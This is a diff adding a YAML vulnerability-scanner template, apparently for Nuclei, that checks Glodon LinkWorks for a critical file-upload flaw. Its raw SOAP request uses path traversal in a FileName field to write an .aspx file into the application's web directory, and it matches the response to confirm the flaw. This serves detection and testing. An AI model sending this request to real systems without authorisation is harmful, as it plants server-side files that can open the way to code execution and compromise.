@@ -1,0 +1,54 @@
+id: glodon-linkworks-file-upload
+
+info:
+  name: Glodon LinkWorks File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Glodon LinkWorks (also known as GlinkLink or GTP-LinkWorks) is a BIM collaboration platform. This vulnerability allows attackers to upload malicious files, potentially leading to malicious code execution, identity forgery, backdoor implantation, and sensitive data leakage.
+  tags: file-upload
+
+http:
+  - raw:
+      - |
+        POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:GetGWGDData>
+                 <tem:data>
+                    <root>
+                       <GWINFO>
+                          <公文标题>1</公文标题>
+                          <拟稿人>拟稿人</拟稿人>
+                          <主送单位>主送单位</主送单位>
+                          <主题词>主题词</主题词>
+                          <印发份数>1</印发份数>
+                          <签发日期>2022-12-07</签发日期>
+                       </GWINFO>
+                       <aa>
+                          <FileName>./../../../../../../../applications/gtp-default/Web/Common/test_upload.aspx</FileName>
+                          <DownLoadURL>http://{{Hostname}}/ps/aspx/upload.aspx</DownLoadURL>
+                       </aa>
+                    </root>
+                 </tem:data>
+              </tem:GetGWGDData>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test_upload.aspx"
+      - type: regex
+        part: body
+        regex:
+          - "<DownLoadURL>http://.*?/ps/aspx/upload.aspx</DownLoadURL>"
